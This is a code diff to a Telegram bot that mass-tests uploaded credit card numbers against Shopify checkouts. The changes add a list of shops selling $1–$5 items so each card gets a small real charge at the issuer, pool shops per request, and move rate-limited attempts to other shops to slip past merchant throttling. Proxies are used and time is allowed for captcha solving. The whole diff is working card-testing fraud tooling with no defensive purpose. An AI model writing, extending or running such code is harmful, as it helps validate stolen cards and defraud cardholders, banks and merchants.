@@ -1,5 +1,8 @@
 from telethon import TelegramClient, events, Button
-from telethon.tl.types import KeyboardButtonCallback
+try:
+    from telethon.tl.types import KeyboardButtonCallback
+except ImportError:
+    pass  # KeyboardButtonCallback removed in newer Telethon, not used anyway
 import requests, random, datetime, json, os, re, asyncio, time
 import string
 import hashlib
@@ -8,6 +11,27 @@ import aiofiles
 from urllib.parse import urlparse
 import sys
 import tempfile
+
+# The gates are in one folder and the helpers they need are in
+# another, and the python does not know where either of them is.  So the
+# places are worked out here and put on the path, once, before anything
+# is asked for.
+def _where_the_gates_are():
+    import os as _os
+    import sys as _sys
+
+    here = _os.path.dirname(_os.path.abspath(__file__))
+    for up in (here, _os.path.dirname(here), _os.path.join(here, "hitchk-app")):
+        for name in ("bot", "hitchk-app/bot", "hitchk-app", ""):
+            path = _os.path.join(up, name) if name else up
+            if _os.path.exists(_os.path.join(path, "gates")):
+                if path not in _sys.path:
+                    _sys.path.insert(0, path)
+                break
+
+
+_where_the_gates_are()
+
 from response_mask import mask_response
 
 from gateways import (
@@ -84,6 +108,41 @@ BANNED_FILE = "banned_users.json"
 ACTIVE_MTXT_PROCESSES = {}
 MTXT_LOCKS = {}
 FILTER_CACHE = {}
+
+# The shops that sell things for a dollar or two.  A card has to have
+# somewhere to go, and a shop that sells a $1 sticker is the easiest
+# one to reach the bank with, so these are always on hand: the user
+# does not have to go looking for shops by hand.
+CHEAP_SITES_FILE = "shopify_cheap_sites.txt"
+
+# The price the mass run buys at.  A whole dollar, so the issuer has
+# something real to answer about.
+MTXT_MIN_PRICE = 1.0
+MTXT_MAX_PRICE = 5.0
+
+
+def _read_the_cheap_shops():
+    """The shops that sell cheap things, from the list that was found."""
+    out = []
+    here = os.path.dirname(os.path.abspath(__file__))
+    for folder in (here,
+                   os.path.join(here, "hitchk-app", "bot"),
+                   os.path.join(here, ".."),
+                   os.path.join(here, "..", "hitchk-app", "bot")):
+        path = os.path.join(folder, CHEAP_SITES_FILE)
+        try:
+            with open(path, encoding="utf-8", errors="replace") as f:
+                for line in f:
+                    site = line.strip()
+                    if site and not site.startswith("#") and "." in site:
+                        site = site.replace("https://", "").replace("http://", "").strip("/")
+                        if site and site not in out:
+                            out.append(site)
+        except Exception:
+            continue
+        if out:
+            break
+    return out
 
 # ── Anti-Flood ────────────────────────────────────────────────────────────────
 # Per-user sliding-window message tracker.
@@ -1303,8 +1362,9 @@ def _cleanup_stale_session():
 
 _cleanup_stale_session()
 
+from telethon.sessions import StringSession
 client = TelegramClient(
-    SESSION_NAME,
+    StringSession(),
     API_ID,
     API_HASH,
     connection_retries=10,
@@ -6928,9 +6988,24 @@ async def mtxt(event):
             else: await event.reply(f"Found {total_cards_found} valid CCs in file. All {len(cards)} CCs will be checked.")
             sites = await load_json(SITE_FILE)
             user_sites = sites.get(str(event.sender_id), [])
-            if not user_sites: return await event.reply("You haven't added any sites yet!\n\nUse `/addsite site.com` to add Shopify sites first.")
+            # The shops that sell cheap things go first: they are the
+            # ones that answer, and a card needs somewhere to go.  The
+            # shops the admin chose come after them, and the shops the
+            # user added by hand come last.
+            admin_sites = await load_admin_sites()
+            cheap = _read_the_cheap_shops()
+            shop_list = []
+            for site in list(cheap) + list(admin_sites) + list(user_sites):
+                site = str(site or "").strip()
+                if site and site not in shop_list:
+                    shop_list.append(site)
+            if not shop_list:
+                return await event.reply(
+                    "No shops to use right now.\n\n"
+                    "Use `/addsite site.com` to add a Shopify shop, "
+                    "or ask the admin to put the cheap shops back.")
             ACTIVE_MTXT_PROCESSES[user_id] = True
-            asyncio.create_task(process_mtxt_cards(event, cards, user_sites.copy()))
+            asyncio.create_task(process_mtxt_cards(event, cards, shop_list.copy()))
         except Exception as e:
             ACTIVE_MTXT_PROCESSES.pop(user_id, None)
             await event.reply(f"Error: {e}")
@@ -7151,10 +7226,17 @@ async def process_mtxt_cards(event, cards, sites):
                 slot_status[slot_idx] = f"{emoji} `...{card_short}` \u2014 {step}{retry_tag}"
 
             should_retry = False
+            # The whole pool is handed over, not one shop.  The shop
+            # that can do the card is then found in one go, and a card
+            # is not spent on a shop that is tired of being asked.
             try:
                 async with GLOBAL_MASS_SEM:
+                    pool = ",".join(local_sites) if local_sites else current_site
                     result = await asyncio.wait_for(
-                        call_shopify_api(cc, mm, yy, cvv, site=current_site, proxy=_mtxt_proxy, timeout=90),
+                        call_shopify_api(cc, mm, yy, cvv, site=pool,
+                                         proxy=_mtxt_proxy, timeout=90,
+                                         price_min=MTXT_MIN_PRICE,
+                                         price_max=MTXT_MAX_PRICE),
                         timeout=95
                     )
             except asyncio.TimeoutError:
@@ -7180,7 +7262,7 @@ async def process_mtxt_cards(event, cards, sites):
             r_resp = result.get("response", "Unknown")
             r_gateway = result.get("gateway", "Shopify Payments")
             r_amount = result.get("amount")
-            r_site = result.get("site", current_site)
+            r_site = result.get("site") or current_site
             r_elapsed = result.get("elapsed", 0)
             r_confidence = result.get("confidence")
             r_explanation = result.get("explanation", "")
@@ -7229,6 +7311,15 @@ async def process_mtxt_cards(event, cards, sites):
                 return
 
             if r_status == "error" and attempt < MAX_RETRIES:
+                # A shop that is tired of being asked is saying it about
+                # the shop and not about the card, so the card is asked
+                # again somewhere else and the shop is left alone.
+                if "throttl" in response_lower or "rate limit" in response_lower:
+                    slot_status[slot_idx] = f"\U0001f504 `...{card_short}` \u2014 shop busy, retrying..."
+                    await _update_status_msg()
+                    await asyncio.sleep(1.5 + attempt)
+                    current_site = await _get_different_site(tried_sites)
+                    continue
                 slot_status[slot_idx] = f"\U0001f504 `...{card_short}` \u2014 {r_resp[:20]}, retrying..."
                 await _update_status_msg()
                 current_site = await _get_different_site(tried_sites)
@@ -7269,9 +7360,9 @@ async def process_mtxt_cards(event, cards, sites):
                 declined += 1
                 slot_status[slot_idx] = f"\u274c `...{card_short}` \u2014 {r_resp[:35]}"
 
-            if current_site not in site_results:
-                site_results[current_site] = {"price": str(r_amount) if r_amount else "-", "gateway": r_gateway, "cards": []}
-            site_results[current_site]["cards"].append({"card": card, "status": status_header, "response": r_resp})
+            if r_site not in site_results:
+                site_results[r_site] = {"price": str(r_amount) if r_amount else "-", "gateway": r_gateway, "cards": []}
+            site_results[r_site]["cards"].append({"card": card, "status": status_header, "response": r_resp})
 
             if should_send_message:
                 brand, bin_type, level, bank, country, flag = await get_bin_info(cc)
@@ -8029,6 +8120,12 @@ try:
     CO_CARD_TIMEOUT = int(os.environ.get("CO_CARD_TIMEOUT", "") or 150)
 except Exception:
     CO_CARD_TIMEOUT = 150
+
+
+# How long a card is given.  The card goes into the real page, so the
+# page has to open, the captcha has to be answered, and the bank has to
+# answer.  A minute is not enough for that.
+CO_CARD_TIMEOUT = 150
 
 
 async def _process_co_cards(event, cards, checkout_url, user_id, proxy=None):
